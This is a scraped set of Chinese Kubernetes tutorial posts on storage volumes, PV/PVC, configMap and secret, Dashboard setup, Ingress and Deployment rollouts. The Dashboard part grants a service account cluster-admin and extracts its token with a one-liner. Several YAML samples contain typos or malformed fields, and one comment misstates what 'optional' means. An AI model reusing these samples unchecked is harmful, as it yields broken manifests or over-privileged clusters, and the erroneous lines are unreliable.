分布式存储（分机系统或块级别），glusterfs，ceph(rbd ceph的块接口存储)，cephfs等。 云存储：EBS（弹性块存储）亚马逊 ,Azure Disk 微软。此模型只适用于Kubernetes集群托管在其公有云之上的场景。 使用kubectl explain pod.spec.volumes查看Kubernetes所支持的存储类型。\nemptyDir 语法\nemptyDir medium 媒介类型 empty string （disk 默认） or memory sizeLimit 空间上限 定义完存储卷之后，需要在container当中使用volumeMounts指明挂载哪个或哪些个存储卷\n- container\r- mountPath 挂载路径\r- name 挂载那个卷\r- readOnly 是否只读挂载\r- subPath 是否挂载子路径之下\rapiVersion: v1\rkind: Pod\rmetadata:\rname: my-nginx\rnamespace: default\rspec:\rcontainers:\r- name: busybox\rimage: busybox\rimagePullPolicy: IfNotPresent\rports:\r- name: http\rcontainerPort: 80\rcommand: [\u0026quot;tail\u0026quot;]\rvolumeMounts: # 指明挂载哪一个存储卷\r- name: html\rmountPath: /data/web/html # 指明挂载到容器的哪个路径下\rvolumes:\r- name: html\remptyDir: {} # 表示空映射，都使用默认值，大小不限制，使用磁盘空间，而不是不定义\r在Kubernetes中 $()是变量引用\ngitRepo 将git仓库当做存储卷来使用，其实并不是Pod将git仓库当存储卷来使用。只不过是在Pod创建时，会自动连接到git仓库之上（此链连接依赖于宿主机上有git命令来完成），由宿主机驱动，将git仓库中的内容clone到本地来，并且将其作为存储卷挂载至Pod之上。\n==gitRepo是建立在emptyDir之上==。所不同的在于，将所指定仓库的内容clone下来并放至空目录中。因此主容器将此目录当做服务于用户的数据来源。需要注意的是，在此处做的修改是不会同步到git仓库中去的。\n如果git仓库在Pod运行过程中内容发生改变，Pod之内的存储卷内容是不会随之改变的。\ngitRepo 卷示例：\napiVersion: v1\rkind: Pod\rmetadata:\rname: my-git\rnamespace: default\rspec:\rcontainers:\r- name: git\rimage: nginx\rimagePullPolicy: IfNotPresent\rports:\r- name: http\rcontainerPort: 80\rvolumeMounts:\r- name: git-volumes\rmountPath: /data/web/html\rvolumes:\r- name: git-volumes\rgitRepo:\rrepository: \u0026quot;https://github.com/potester/test-k8s.git\u0026quot;\rrevision: \u0026quot;master\u0026quot;\r查看Pod内容器挂载的目录\n$ kubectl exec -it my-git -- ls -l /data/web/html/test-k8s/\rtotal 16\rnginx.svc\rredis.svc\rsvc-redis\rtest.yaml\rhostPath hostPath 将Pod所在宿主机之上、脱离Pod中容器名称空间之外的宿主机的文件系统的某一目录与Pod建立关联关系。在Pod被删除时，此存储卷是不会被删除的。\nhostPath在一定程度上拥有持久的特性，但这种持久只是节点级的持久，在被跨节点调度时，这些数据还是会丢失的。\nVolumes - Kubernetes\ntype\nDirectoryOrCreate 挂载路径在宿主机上是已存在的目录，如目录不存在则创建此目录。 Directory 挂载路径在宿主机上必须已存在的目录。 FileOrCreate 文件或创建新的空文件。 File 必须存在此文件，将其挂载至容器中。 Socket 必须是socket类型的文件。 CharDevice 必须是一个字符类型的设备文件。 BlockDevice 块类型的设备文件。 hostPath 卷示例：\napiVersion: v1\rkind: Pod\rmetadata:\rname: pod-hostPath\rnamespace: default\rspec:\rcontainers:\r- name: myapp\rimage: nginx:1.8\rvolumeMounts:\r- name: html\rmountPath: /usr/share/nginx/html/ # 挂载路径\rvolumes: # 定义存储卷\r- name: html\rhostPath:\rpath: /data/html\rtype: DirectoryOrCreate\rNFS，对于nfs存储卷来讲 path -required- nfs服务器导出路径， readOnly 只读 true or false 默认false server [required] 服务器地址 volumes:\r- name: html\rnfs:\rpath: /data/volumes/\rserver: nfs01.test.com\rPVC使用逻辑 在Pod中只需定义存储卷，定义时只需指定使用存储卷大小，这个存储卷叫PVC类型的存储卷。PVC存储卷必须与当前名称空间中的PVC建立直接绑定关系，而PVC必须与PV建立绑定关系，而PV是某个真实存储设备上的存储空间。所以PV和PVC是kubernetes系统之上的抽象的标准资源。PV和PVC之间的关系，在PVC不被调用时是空载的。\n对于PV类型的资源的使用\nPVC语法 PVC是标准K8S资源，也有自己所属的属组。\nkubectl explain pvc\napiVersion: v1\rkind: pvc\rmetadata:\rname: k8s-pvc\rnamespaces: default\rspec:\raccessModes # 访问模型\rresources # 资源限制，至少多少G\rselector # 标签选择器，必须要选择哪个PV建立关联关系\rstorageClassName # 存储类名称\rvolumeMode # 后端存储卷模式。\rvolumeName # 存储卷名称，指后端PersistentVolume\rPVC选择的模式\n使用存储卷名称，一对一绑定了（精确选择）， 选择器选定 如不指定名称，会从大量符合条件的PV选一个。 类型限制，volumeMode，那一类型的PV可以被当前claim所使用。 在Pod中使用当前名称空间已经存在的PVC exportfs -arv kubectl explain pods.spec.volumes.persistentVolumeClaim，PV和PVC的关联是一对一的，一旦被使用（状态为banding）\nvolmes\rpersistentVolumeClaim\rclaimName # pvc名称\rreadOnly # 要不要只读\r定义PV时一定不要加名称空间，PV是集群级别的，不属于名称空间，但==PVC是属于名称空间级别==的。PVC并不属于节点(node)，PVC是标准的Kubernetes资源，它存储在etcd当中。只有Pod才需要运行在节点之上，所有其他资源基本都是保存在集群状态存储（apiserver的存储）etcd当中。\n在Kubernetes新版本中，只要PV还被PVC绑定，就不支持删除。\n定义accessMode时需要注意存储设备，有些存储设备不支持多路读写与多路只读，只支持单路读写。\naccessMode []string accessMode可定义多个参数 ReadWriteOnce 单路读写，可简写为RWO ReadOnlyMany 多路只读，ROX ReadWriteMany 多路读写操作 RWX capacity 用来指定存储空间的大小，需要使用资源访问模型来定义。 capacity resources.md persistentVolumeReclaimPolicy 回收策略 Persistent Volumes Retain 保留。 Recycle 回收，将数据删除，并且把PV置为空闲状态可以让其他设备绑定。 delete 删除PV apiVersion: v1\rkind: PersistentVolume\rmetadata:\rname: pv01\rlabels:\rname: pv01\rtype: ssd\rspec:\rnfs:\rpath: /data/pv01\rserver: 192.168.1.2\raccessModes: [\u0026quot;ReadWriteMany\u0026quot;,\u0026quot;ReadWriteOnce\u0026quot;]\rcapacity:\rstorage: 200Mi\rPVC\nspec accessModes PVC也需要定义accessModes，此accessModes模式要求一定是PV的accessModes的子集才可以被匹配到。 resources 如指定，PV一定要满足（大于、等于）PVC此值才能被使用。 requests []map此处是与PV不一样之处，需要要求有多大空间 PVC的使用\napiVersion: v1\rkind: PersistentVolume\rmetadata:\rname: pv01\rlabels:\rname: pv-test1\rspec:\raccessModes: - ReadWriteOnce\rcapacity: storage: 2Gi\rnfs:\rpath: /data/v1\rserver: 10.0.0.11\r---\rapiVersion: v1\rkind: PersistentVolume\rmetadata:\rname: pv02\rlabels:\rname: pv-test2\rspec:\raccessModes:\r- ReadWriteOnce\rcapacity: storage: 2Gi\rnfs:\rpath: /data/v2\rserver: 10.0.0.11\r---\rapiVersion: v1\rkind: PersistentVolume\rmetadata:\rname: pv03\rlabels:\rname: pv-test3\rspec:\raccessModes:\r- ReadWriteOnce\rcapacity: storage: 2Gi\rnfs:\rpath: /data/v3\rserver: 10.0.0.11\r查看PV和PVC\n$ kubectl get pv\rNAME CAPACITY ACCESS MODES RECLAIM POLICY STATUS CLAIM STORAGECLASS REASON AGE\rpv01 2Gi RWO Retain Bound default/pvc1 5h45m\rpv02 2Gi RWO Retain Available 5h45m\rpv03 2Gi RWO Retain Available 5h45m\r$ kubectl get pvc\rNAME STATUS VOLUME CAPACITY ACCESS MODES STORAGECLASS AGE\rpvc1 Bound pv01 2Gi RWO 5h11m\rStorageClass 在PVC申请时，未必就有现成的PV能正好符合PVC在申请中指定的条件，为此Kubernetes设计了一种工作逻辑，能够让PVC在申请PV时不针对某个PV进行。可以针对某个存储类（Kubernetes之上的标准资源之一）StorageClass，借助此资源层，来完成资源分配的。\nStorageClass可以理解为，事先把众多的存储设备当中所提供好的现有可用存储空间（尚未做成PV的存储空间）进行分类（根据综合服务质量、IO性能等）。定义好存储类之后，当PVC再去申请PV时，不针对某个PV直接进行，而是针对存储了进行。必须让存储设备支持Restful风格的请求创建接口，用户可以通过Restful风格的请求1.在磁盘上划分刚好符合PVC大小的分区。2 编辑/etc/export文件，将分区挂载至本地某个目录上。3. 动态创建PV去绑定之前动态导出的空间。\nnfs 动态\nexternal-storage/nfs-client at master · kubernetes-incubator/external-storage · GitHub\nDocker(二十九)k8s 创建动态存储，基于nfs 的storageclass-洒脱，是云谈风轻的态度-51CTO博客\n通过consul、confd，动态为prometheus添加监控目标和告警规则\n使用Prometheus建设Kubernetes的监控告警系统\n","permalink":"https://www.oomkill.com/2018/09/k8s-volumes/","summary":"","title":"Kubernetes存储卷"},{"content":"secret、configMap特殊类型的存储卷，多数情况下不是为Pod提供存储空间来用的，而是给管理员或用户提供了从集群外部向Pod内部应用注入配置信息的方式。\n工作实现\nconfigMap 在集群内部存在一个名称空间，在名称空间当中拥有一个可正常运行的Pod，当镜像启动时使用的配置文件在做镜像之前就确定了，并且做完镜像就不能修改了。除非在做镜像时使用entryPoint脚本去接受用户启动容器时传入环境变量进来，将环境变量的数据替换到配置文件中去，从而使应用程序在启动之前就能获得一个新的配置文件而后得到新的配置。当需要修改配置文件时是很麻烦的。而配置中心只需将集中的配置文件修改，并通知给相应进程，让其重载配置文件。而Kubernetes的应用也存在此类问题，当配置文件修改后就需要更新整个镜像。因此无需将配置信息写死在镜像中。而是引入一个新的资源，这个资源甚至是整个Kubernetes集群上的一等公民（标准的K8S资源）。这个资源被叫做configMap\nconfigMap当中存放的配置信息，随后启动每一个Pod时，Pod可以共享使用同一个configMap资源，这个资源对象可以当存储卷来使用，也可以从中基于环境变量方式从中获取到一些数据传递给环境变量，注入到容器中去使用。 因此configMap扮演了Kubernetes中的配置中心的功能。但是configMap是明文存储数据的。因此和configMap拥有同样功能的标准资源secret就诞生了。与configMap所不同之处在于，secret中存放的数据是用过编码机制进行存放的。\n核心作用：让配置信息从镜像中解耦，从而增强应用的可移植性与复用性。使一个镜像文件可以为应用程序运行不同配置的环境而工作。简单来讲，一个configMap就是一系列配置数据的集合。这些数据可以注入到Pod对象中的容器所使用。\n在configMap中，所有的配置信息都保存为key value格式。V只是代表了一段配置信息，可能是一个配置参数，或整个配置文件信息都是没有问题的。\n配置容器化应用的方式\n自定义命令行参数 args [] 把配置文件直接陪进镜像； 环境变量 Cloud Native的应用程序一般可直接通过环境变量加载配置 通过entrypoint脚本来预处理变量为配置文件中的配置信息。 存储卷 配置文件注入方式：\n将configMap做存储卷 使用env docker config\ncontioners env name 变量名 value 变量值 valueFrom 数据不是一个字符串，而是引用另外一个对象将其传递给这个变量。 configMapKeyRef configMap中的某个键 fieldRef 某个字段。此资源可以是Pod自身的字段。如metadata.labels status.hostIP status.podIP resourceFieldRef 资源需求和资源限制。 secreKeyRef 引用secre configMap无需复杂描述，因此没有spec字段\napiVersion\rkind\rdata\rbinaryData 一般情况下data与binaryData只使用其中一种。\r创建简单的configMap还可以使用 kubectl create configMap来创建。如需要长期使用，可以定义为配置清单文件。\nkubectl create configmap nginx-config \\\r--from-literal=nginx_port=80 \\\r--from-literal=servername=test.com\r使用文件创建\nkubectl create configmap nginx-conf --from-file=www.conf\r将configMap注入到Pod中。\n方式1：使用环境变量方式注入\nenv:\r- name: NGINX_SERVER_PORT\rvalueFrom:\rconfigMapKeyRef:\rname: nginx-config\rkey: nginx_port\roptional # 如为true表示必须拥有此key\r- name: NGINX_SERVER_NAME\rvalueFrom:\rconfigMapKeyRef:\rname: nginx-config\rkey: server_name\r当使用环境变量方式注入时，只在系统启动时有效，如使用存储卷方式定义的，是可以实时更新的。\n方式2：\ncontainers:\r- name: nginx-configMap\rvolumeMounts:\r- name: nginxconfig\rmountPaht: /etc/nginx/con.d/\rreadOnly: true # 不需要容器去修改他的内容\rvolumes:\r- name: nginxconfig\rconfigMap: # volume类型\rname: nginx-conf\rk8s 节点为了运行Pod，而获取镜像，镜像如果托管在必须认证才能获取的私有仓库上时。node节点上的kubelet需能自动完成认证。\ndocker-registry docker私有仓库认证信息使用 generic tls 证书私钥\nspec\nimagePullSecrets Pod在创建时，如果要连到私有仓库需要做认证，此处的secret包含了让kubelet去连接私有仓库的账号和密码。此账号密码是secret对象提供的， 必须是专用对象。 创建方法\nkubectl create secret type(docker-registry|generic|tls) Name 查询\nkubectl get secret passwd -o yaml\renv方式载入secret\nenv:\r- name: MYSQL_ROOT_PASSWD\rvalueFrom:\rsecretKeyRef:\rname: root-pwd\rkey: passwd\roptional # 如为true表示必须拥有此key\r","permalink":"https://www.oomkill.com/2018/09/k8s-cm/","summary":"","title":"kubernetes概念 - configMap"},{"content":"基于web的UI前端，认证是由Kubernetes完成的。登陆dashboard的密码是k8s的账号和密码，和dashboard自身没有关系。dashboard自身不做认证。\nkubectl patch svc kubernetes-dashboard -p'{\u0026quot;spec\u0026quot;:{\u0026quot;type\u0026quot;:\u0026quot;NodePort\u0026quot;}}'-n kube-system\r如使用域名访问，CN一定要与域名保持一致。\n(umask 077; openssl genrsa -out dashboard.key 2048)\ropenssl req -new -key dashboard.key -out dashboard.csr -subj \u0026quot;/O=test/CN=dashboard\u0026quot;\ropenssl req -in dashboard.csr -noout -text\ropenssl x509 -req -in dashboard.csr -CA ca.crt -CAkey ca.key -CAcreateserial -out dashboard.crt -days 3650\rCertificate Attributes\n要想穿透集群边界，从集群外访问集群内部某一服务或Pod上的容器的应用，有两种方式 nodePort、NodeBlanc 或ingress\nkubectl create secret generic \\\rdashboard-cert \\\r-n kube-system \\\r--from-file=dashboard.crt=./dashboard.crt \\\r--from-file=dashboard.key=./dashboard.key\rdashboard运行在Pod中时，当用户通过浏览器来进行登陆时，所提供的认证证书必须时serviceaccount，\nkubectl create serviceaccount dashboard-admin -n kube-system\r通过rolebindding吧对应的dashboard-admin和集群管理员建立起绑定关系，否则无法透过rbac的权限检查。\n指明serviceaccount时，必须指明是哪个名称空间的的哪个账号，格式：namespace:serviceaccount\nkubectl create clusterrolebinding dashboard-cluster-admin --clusterrole=cluster-admin --serviceaccount=kube-system:dashboard-admin\r使serviceaccount用户，能够有权限访问整个集群级别的资源。\n查询dashboard-admin的secret，这个是自动生成的。\nkubectl get secret $(kubectl get secret -n kube-system|grep dashboard-admin-token|awk '{print $1}') -n kube-system -o jsonpath={.data.token}|base64 -d\rkubectl config set-credentials 命令，用户的认证方式，既可以使用证书方式，也可以使用token认证。\n在apply之前先将证书做成secret，apply操作会将其加载成为apply操作对外提供https服务时使用的证书。此操作作为serviceaccount认证是没有关系的，只不过是被dashboard用来做https证书的。如果不提供证书，dashboard会自动生成新的证书。\nkubernetes dashboard延长自动超时注销 方法1：部署清单时，修改yaml文件，添加 container.Args 增加 --token-ttl=43200 其中43200是设置自动超时的秒数。也可以设置 token-ttl=0 以完全禁用超时。\n方法2：操作已经部署的配置，kubectl edit deployment -n kube-system kubernetes-dashboard，新增上面参数到 args 中\n","permalink":"https://www.oomkill.com/2018/09/k8s-dashboard/","summary":"","title":"kubernetes概念 - Dashboard"},{"content":"IngressController比较独特，它与DaemonSet、Deployment、Repliacaset不同，DaemonSet、Deployment等控制器是作为ControllerManager的子组件存在的。Ingress Controller是独立运行的一组Pod资源，通常是拥有七层代理、调度能力的应用程序。\n通常在使用IngressController时有三种选择Nginx、Traefik、Envoy。\nIngressController nginx运行在Pod中，其配置文件是在Pod中。后端代理的Pod随时会发生变动，IngressController需要watch API当中的后端Pod资源的改变。IngressController自身无法识别目前符合自己关联的（条件的）被代理的Pod资源有哪些，IngressController需借助service来实现。\n因此要想定义一个对应的调度功能，还需要创建service，此service通过label selector关联至每一个upstream服务器组，通过此service资源关联至后端的Pod。此service不会被当做被代理时的中间节点，它仅仅是为Pod做分类的。此service关联的Pod，就将其写入upstream中。\n在Kubernetes中有一种特殊资源叫做Ingress，当Pod发生改变时，其servcie对应的资源也会发生改变， 依赖于IngressResource将变化结果反应至配置文件中。\nIngress定义期望IngressController如何创建前段代理资源（虚拟主机、Url路由映射），同时定义后端池（upstream）。upstream中的列表数量，是通过service获得。\nIngress可以通过编辑注入到IngressController中，并保存为配置文件，且Ingress发现service选定的后端Pod资源发生改变，此改变会及时反映至Ingress中，Ingress将其注入到前端调度器Pod中，并触发Pod中的container主进程（nginx）重载配置文件。\n要想使用Ingress功能，需要有service对某些后端资源进行分类，而后Ingress通过分类识别出Pod的数量和IP地址信息，并将反映结果生成配置信息注入到upstream中。\nIngressController根据自身需求方式来定义前端，而后根据servcie收集到的后端Pod IP定义成upstream server，将这些信息反映在Ingress server当中，由Ingress动态注入到IngressController当中。\nIngress也是标准的Kubernetes资源，定义Ingress时同样类似于Pod方式来定义。使用kubectl explain Ingress查看帮助。\nspec rules 规则，对象列表 host 主机调度 虚拟主机而非url映射 http paths 路径调度 backend path backend 定义被调度的后端主机，靠service定义，找到后端相关联的Pod资源。 serviceName 后端servcie名称，即用来关联Pod资源的service。 servicePort IngressController部署\nnamespace.yaml 创建名称空间 configmap.yaml 为nginx从外部注入配置的 rbac.yaml 定义集群角色、授权。必要时让IngressController拥有访问他本身到达不了的名称空间的权限\ningress.yaml\napiVersion: extensions/v1beta1\rkind: Ingress\rmetadata:\rname: ingress-myapp\rnamespace: defualt # 与deployment和要发布的service处在同一名称空间内\rannotations:\rkubernetes.io/ingress.class: \u0026quot;nginx\u0026quot;\rspec:\rrules:\r- host: test.baidu.com # 这个是外部访问域名，service映射到主机节点地址上\rhttp:\rpaths:\r- pach: backend:\rserviceName: myapp servicePort: 80\r证书是不能直接贴入ingress中的，需要将其转为特殊格式 secret， secret是标准的Kubernetes对象，c可以直接注入到Pod中被Pod所引用。\nKubernetes的负载均衡问题(Nginx Ingress) - ericnie - 博客园\nInstallation Guide - NGINX Ingress Controller\n","permalink":"https://www.oomkill.com/2018/09/k8s-ingress/","summary":"","title":"kubernetes概念 - ingress"},{"content":"Deployment当中借助于ReplicaSet进行更新的策略反映在Deployment的对象定义所需字段可使用kubectl explain deploy，Deployment属于extension群组。在1.10版本中它被移至到apps群组。他与ReplicaSet相比增加了几个字段。\nstratgy 重要字段，定义更新策略，它支持两种策略 重建式更新 Recreate与滚动更新RollingUpdate，如果type为RollingUpdate，那么RollingUpdate的策略还可以使用RollingUpdate来定义，如果type为Recreate，那么RollingUpdate字段无效。 默认值为RollingUpdate\nstratgy.RollingUpdate控制RollingUpdate更新力度\nmaxSurge 对应的更新过程当中，最多能超出目标副本数几个。有两种取值方式，为直接指定数量和百分比。在使用百分比时，在计算数据时如果不足1会补位1个。 maxUnavailable 最多有几个副本不可用。 revisionHistoryLimit 滚动更新后，在历史当中最多保留几个历史版本，默认10。\n在使用Deployment创建Pod时，Deployment会自动创建ReplicaSet，而且Deployment名称是使用Pod模板的hash值，此值是固定的。\nDeployment在实现更新应用时，可以通过编辑配置文件来实现，使用kubectl apply -f更改每次变化。每次的变化通过吧变化同步至apiserver中，apiserver发现其状态与etcd不同，从而改变etcd值来实现修改其期望状态，来实现现有状态去逼近期望状态。\nkubectl explain deploy\napiVersion: apps/v1\rkind: Deployment\rmetadata:\rname: app-deploy\rnamespace: default\rspec:\rreplicas: 2\rselector:\rmatchLabels:\rapp: deploy\rrelease: canary\rtemplate:\rmetadata:\rlabels:\rapp: deploy\rrelease: canary\rspec:\rcontainers:\r- name: my-deploy\rimage: node01:5000/busybox:v1\rports:\r- name: http\rcontainerPort: 80\rcommand: [\u0026quot;/bin/sh\u0026quot;,\u0026quot;-c\u0026quot;,\u0026quot;/bin/httpd -f -h /tmp\u0026quot;]\r使用kubectl apply 声明式更新、创建资源对象。\n将上述资源配置清单的replicaSet数量改为3个后，可以看到数量增加为3，而对应的hash值没变化。\n$ kubectl apply -f deploy.yaml deployment.apps/app-deploy configured\r$ kubectl get pods\rNAME READY STATUS RESTARTS AGE\rapp-deploy-5b8db6bc7d-bkldv 1/1 Running 0 4s\rapp-deploy-5b8db6bc7d-r2pcv 1/1 Running 0 5h5m\rapp-deploy-5b8db6bc7d-wgbbg 1/1 Running 0 5h5m\r由于Deployment是构建在ReplicaSet之上，对Pod做扩展、缩容是很方便的。处理动态修改资源配置清单外，还可以使用kubectl patch（打补丁）进行操作。\npatch操作是对对象的JSON内容进行打补丁，-p选项值为JSON格式，其建值需以引号引起。\n语法\nkubectl patch\r-p 提供补丁\n$ kubectl patch deployment app-deploy -p '{\u0026quot;spec\u0026quot;:{\u0026quot;replicas\u0026quot;:4}}'\rdeployment.extensions/app-deploy patched\r$ kubectl get pods\rNAME READY STATUS RESTARTS AGE\rapp-deploy-58d74fd87f-555jm 1/1 Running 0 15m\rapp-deploy-58d74fd87f-kkwz9 1/1 Running 0 15m\rapp-deploy-58d74fd87f-vzthx 1/1 Running 0 15m\rapp-deploy-58d74fd87f-zwdn5 1/1 Running 0 4s\rkubectl patch deployment app-deploy -p '{\u0026quot;spec\u0026quot;: {\u0026quot;strategy\u0026quot;: {\u0026quot;rollingUpdate\u0026quot;: {\u0026quot;maxSurge\u0026quot;:1,\u0026quot;maxUnavailable\u0026quot;:0 }}}}'\r更新版本\n在更新完成后使用 kubectl get rs 查看可看到有两个 rs版本，所不同的是，镜像版本不同和可用的数量为0，但这个对应的模板会保留，随时等待回滚。\n$ kubectl get rs -o wide\rNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTOR\rapp-deploy-58d74fd87f 3 3 3 76s my-deploy node01:5000/busybox:v2 app=deploy,pod-template-hash=58d74fd87f,release=canary\rapp-deploy-5b8db6bc7d 0 0 0 5h10m my-deploy node01:5000/busybox:v1 app=deploy,pod-template-hash=5b8db6bc7d,release=canary\r更新版本可以使用可使用 kubectl set image进行更新\n语法\nkubectl set image [-f filename | type name] container=version\rkubectl set image deployment app-deploy my-deploy=node01:5000/busybox:v4 \u0026amp;\u0026amp; kubectl rollout pause deployment app-deploy\r此时可以看到rs保留多个版本\n$ kubectl get rs -o wide\rNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTOR\rapp-deploy-58d74fd87f 0 0 0 34m my-deploy node01:5000/busybox:v2 app=deploy,pod-template-hash=58d74fd87f,release=canary\rapp-deploy-7fbc8b6df 3 3 3 25m my-deploy node01:5000/busybox:v4 app=deploy,pod-template-hash=7fbc8b6df,release=canary\r使用 kubectl rollout pause可以暂停更新。\nkubectl rollout pause type typename\r使用resume可恢复暂停操作\nkubectl rollout resume type typename\rDeployment版本滚动的历史保留 可使用 kubectl rollout history 查看滚动历史\n$ kubectl rollout history deployment app-deploy\rdeployment.extensions/app-deploy REVISION CHANGE-CAUSE\r1 [none]\r2 [none]\r版本回滚 使用 kubectl rollout undo默认是回滚至上一个版本\n语法\nkubectl rollout undo type typename --to-revision=n 回滚至指定版本\nkubectl rollout undo deployment app-deploy --to-revision=1\r回滚后查询当前rs版本\n$ kubectl get rs -o wide\rNAME DESIRED CURRENT READY AGE CONTAINERS IMAGES SELECTOR\rapp-deploy-58d74fd87f 3 3 3 108m my-deploy node01:5000/busybox:v2 app=deploy,pod-template-hash=58d74fd87f,release=canary\rapp-deploy-7fbc8b6df 0 0 0 99m my-deploy node01:5000/busybox:v4 app=deploy,pod-template-hash=7fbc8b6df,release=canary\rDeployment回滚演示\n","permalink":"https://www.oomkill.com/2018/09/kubenetes-deployment/","summary":"","title":"kubernetes概念 - Kubenetes Deployment"},{"content":"Kubernetes资源清单 类别 名称 工作负载型资源（workload） 运行应用程序，对外提供服务：Pod、ReplicaSet、Deployment、StatefulSet、DaemonSet、Job、Cronjob （ReplicationController在v1.11版本被废弃） 服务发现及负载均衡 service、Ingress 配置与存储 Volume、CSI（容器存储接口 特殊类型存储卷 ConfigMap（当配置中心来使用的资源类型）、Secret（保存敏感数据）、DownwardAPI（把外部环境中的信息输出给容器） 集群级资源 Namespace、Node、Role、ClusterRole、RoleBinding（角色绑定）、ClusterRoleBinding（集群角色绑定） 元数据型资源 HPA、PodTemplate（Pod模板，用于让控制器创建Pod时使用的模板）、LimitRange（用来定义硬件资源限制的） Kubernetes配置清单使用说明 在Kubernetes中创建资源时，除了命令式创建方式，还可以使用yaml格式的文件来创建符合我们预期期望的pod，这样的yaml文件我们一般称为资源清单。资源清单由很多属性或字段所组成。\n以yawl格式输出pod的详细信息。\n资源清单格式 kubectl get pod clients -o yaml\rPod资源清单常用字段讲解 在创建资源时，apiserver仅接收JSON格式的资源定义。在使用kubectl run命令时，自动将给定内容转换成JSON格式。yaml格式提供配置清单，apiserver可自动将其转为JSON格式，（yaml可无损转为json），而后再提交。使用资源配置请清单可带来复用效果。\nPod资源配置清单由五个一级字段组成，通过kubectl create -f yamlfile就可以创建一个Pod\napiVersion: 说明对应的对象属于Kubernetes的哪一个API群组名称和版本。给定apiVersion时由两部分组成group/version，group如果省略表示core（核心组）之意。使用kubectl api-versions获得当前系统所支持的apiserver版本。alpha 内测版、beta 公测版、stable 稳定版\nkind: 资源类别，用来指明哪种资源用来初始化成资源对象时使用。\nmetadata: 元数据，内部嵌套很多2级、3级字段。主要提供以下几个字段。\nname，在同一类别当中name必须是唯一的。\nnamespace 对应的对象属于哪个名称空间，name受限于namespace，不同的namespace中name可以重名。\nlables key-value数据，对于key名称及value，最多为63个字符，value，可为空。填写时只能使用字母、数字、_、-、.，只能以字母或数字开头及结尾。\nannotations 资源注解。与label不同的地方在于，它不能用于挑选资源对象，仅用于为对象提供“元数据”。对键值长度没有要求。在构建大型镜像时通常会用其标记对应的资源对象的元数据\nspec: specification，定义接下来创建的资源对象应该满足的规范（期望的状态 disired state）。spec是用户定义的。不同的资源类型，其所需要嵌套的字段各不相同。如果某一字段属性标记为required表示为必选字段，剩余的都为可选字段，系统会赋予其默认值。如果某一字段标记为Cannot be updated，则表示为对象一旦创建后不能改变字段值。可使用kubectl explain pods.spec查看详情。\ncontainers [required]object list\nname [string] 定义容器名称\nimage [string] 启动Pod内嵌容器时所使用的镜像。可是顶级、私有、第三方仓库镜像。\nimagePulLPolicy [string] 镜像获取的策略，可选参数Always（总是从仓库下载，无论本地有无此镜像）、Never（从不下载，无论本地有无此镜像）、IfNotPresent（本地存在则使用，不存在则从仓库拉去镜像）。如果tag设置为latest，默认值则为Always，非latest标签，默认值都为IfNotPresent。\nports []object 定义容器内要暴露的端口时，可以暴露多个端口，每个端口应该由多个属性来定义（端口名称、端口号、协议）。注意暴露端口仅仅是提供额外信息的，并不能限制系统是否真能暴露。 command Entrypoint array，运行的程序\nargs 向Entrypoint传递参数，官方对command和args的对比说明Define a Command and Arguments for a Container - Kubernetes\nnodeSelector map[string]string 节点标签选择器，确定Pod只运行在哪个或哪类节点上。\nlivenessProbe [object] 存活性验证\nexec 执行容器中存在的用户自定义命令。 command []string 运行命令来探测是否执行成功。 httpGet tcpSocket failureThreshold 确定失败的探测的失败次数，默认值3，最小值1。 periodSeconds 周期间隔时长。默认10秒。 timeoutSeconds 超时时长，默认1秒。 initialDelaySeconds [integer] 初始化延迟探测时间，默认容器启动时立刻探测。 readinessProbe 就绪性探测\nstatus: 资源的当前状态 current state。Kubernetes用于确保每一个资源定义完后，让其当前状态无限向目标状态转移，从而满足用户期望。从此角度来看，status是只读的，有Kubernets集群自行维护。 Kubernetes内嵌格式说明\n获取pod资源的配置清单帮助 语法格式\nkubectl explain pod.lev1.lev2...\r示例\n$ kubectl explain pod.spec\rKIND: Pod\rVERSION: v1\rRESOURCE: spec {Object}\rDESCRIPTION:\rSpecification of the desired behavior of the pod. More info:\rhttps://git.k8s.io/community/contributors/devel/api-conventions.md#spec-and-status\rPodSpec is a description of a pod.\rFIELDS:\ractiveDeadlineSeconds\t{integer}\rOptional duration in seconds the pod may be active on the node relative to\rStartTime before the system will actively try to mark it failed and kill\rassociated containers. Value must be a positive integer.\raffinity\t{Object}\rIf specified, the pod's scheduling constraints\rautomountServiceAccountToken\t{boolean}\rAutomountServiceAccountToken indicates whether a service account token\rshould be automatically mounted.\rcontainers\t{[]Object} -required-\rList of containers belonging to the pod. Containers cannot currently be\radded or removed. There must be at least one container in a Pod. Cannot be\rupdated.\rhostname\t{string}\rSpecifies the hostname of the Pod If not specified, the pod's hostname will\rbe set to a system-defined value.\rimagePullSecrets\t{[]Object}\r....\r....\r.... volumes\t{[]Object}\rList of volumes that can be mounted by containers belonging to the pod.\rMore info: https://kubernetes.io/docs/concepts/storage/volumes\r资源清单定义 apiVersion: v1\rkind: Pod\rmetadata:\rname: test-pod\rnamespace: default\rlabels:\rapp: myapp-redis\rtier: frontend\rspec:\rcontainers:\r- name: redis-app\rimage: redis\rimagePullPolicy: IfNotPresent\rports:\r- name: redis\rcontainerPort: 6379\r- name: busybox\rimage: busybox\rcommand:\r- \u0026quot;/bin/sh\u0026quot;\r- \u0026quot;-c\u0026quot;\r- \u0026quot;sleep 3600\u0026quot;\r从yaml文件加载创建资源\nkubectl create -f pod.yaml 从yaml文件加载删除资源\nkubectl delete -f pod.yaml 标签选择器的使用 Label是Kubernetes中极具特色的功能之一，是附加在对象之上的键值对，每一个资源可存在多个标签，每一个标签都是一组键值对。每一个标签都可以被标签选择器进行匹配度检查，从而完成资源挑选。Label既可以在对象创建时指定，可以在资源创建啊之后使用命令来管理（添加、修改、删除）。\nLabel可基于简单且直接的标准将Pod多个较小的分组。而service也需要识别标签对其识别并管控，或关联到的资源。最资源设定标签后，还可以使用标签来查看、删除等对其执行相应管理操作。\n⚠ 注意：在定义标签时，资源标签其标签名称key及value的值必须小于等于63个字符，value，可为空。填写时只能使用字母、数字、_、-、.，只能以字母或数字开头及结尾。 在定义键名时也可以使用键前缀(DNS域名)，加前缀总长度不能超过253个字符。\n对标签进行过滤 kubectl get pods常用参数说明\n选项 说明 -l 大S -L，label-columns=[] 接受以逗号分隔的标签列表，这些标签将作为列显示。名字区分大小写。 \u0026ndash;show-labels 在最后一列打印标签。 \u0026ndash;show-labels 显示Pod标签\n$ kubectl get pods --show-labels\rNAME READY STATUS RESTARTS AGE LABELS\rnginx-7cdbd8cdc9-8blzc 1/1 Running 0 39s 